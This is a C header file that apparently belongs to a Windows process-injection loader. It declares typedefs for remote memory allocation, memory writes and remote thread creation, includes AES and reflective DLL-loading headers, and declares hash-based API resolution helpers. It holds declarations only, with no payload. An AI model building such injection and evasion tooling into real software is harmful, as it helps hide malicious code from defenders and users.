#ifndef _HEADERS_H
#define _HEADERS_H
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <intrin.h>
#include "aes.c"
#include "LoadLibraryR.h"
#include "GetProcAddressR.h"
#include <rpc.h>


#define STATUS_SUCCESS 0x00000000
#define STATUS_UNSUCCESSFUL 0xC0000001
#define STATUS_IMAGE_NOT_AT_BASE 0x40000003

typedef struct _PS_ATTRIBUTE
{
	ULONG  Attribute;
	SIZE_T Size;
	union
	{
		ULONG Value;
		PVOID ValuePtr;
	} u1;
	PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes( p, n, a, r, s ) { \
	(p)->Length = sizeof( OBJECT_ATTRIBUTES );        \
	(p)->RootDirectory = r;                           \
	(p)->Attributes = a;                              \
	(p)->ObjectName = n;                              \
	(p)->SecurityDescriptor = s;                      \
	(p)->SecurityQualityOfService = NULL;             \
}
#endif

typedef struct _PS_ATTRIBUTE_LIST
{
	SIZE_T       TotalLength;
	PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, * PSECTION_INHERIT;

//KERNEL32 API'S
typedef HANDLE(WINAPI* PGetCurrentProcess)();
typedef DWORD(WINAPI* PGetCurrentProcessId)();
typedef BOOL(WINAPI* PCloseHandle)(HANDLE);
typedef HANDLE(WINAPI* POpenProcess)(DWORD, BOOL, DWORD);
typedef VOID(WINAPI* PGetSystemInfo)(LPSYSTEM_INFO);
typedef VOID(WINAPI* PGetNativeSystemInfo)(LPSYSTEM_INFO);
typedef BOOL(WINAPI* PGlobalMemoryStatusEx)(LPMEMORYSTATUSEX);
typedef HMODULE(WINAPI* PLoadLibraryA)(LPCSTR);
typedef DWORD(WINAPI* PGetModuleFileNameW)(HMODULE, LPWSTR, DWORD);
typedef BOOL(WINAPI* PGetModuleHandleExW)(DWORD, LPCWSTR, HMODULE);
typedef HANDLE(WINAPI* PCreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI* PSetFileInformationByHandle)(HANDLE, FILE_INFO_BY_HANDLE_CLASS, LPVOID, DWORD);
typedef DWORD(WINAPI* PWaitForSingleObject)(HANDLE, DWORD);
typedef LPVOID(WINAPI* PVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* PVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL(WINAPI* PWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T);
typedef HANDLE(WINAPI* PCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef HMODULE(WINAPI* PLoadLibraryA)(LPCSTR);
typedef HANDLE(WINAPI* PHeapCreate)(DWORD, SIZE_T, SIZE_T);
typedef LPVOID(WINAPI* PHeapAlloc)(HANDLE, DWORD, SIZE_T);
typedef BOOL(WINAPI* PHeapFree)(HANDLE, DWORD, LPVOID);

unsigned int hash(const char*);
PVOID GetDLLAddr();
VOID PopulateK32();

#endif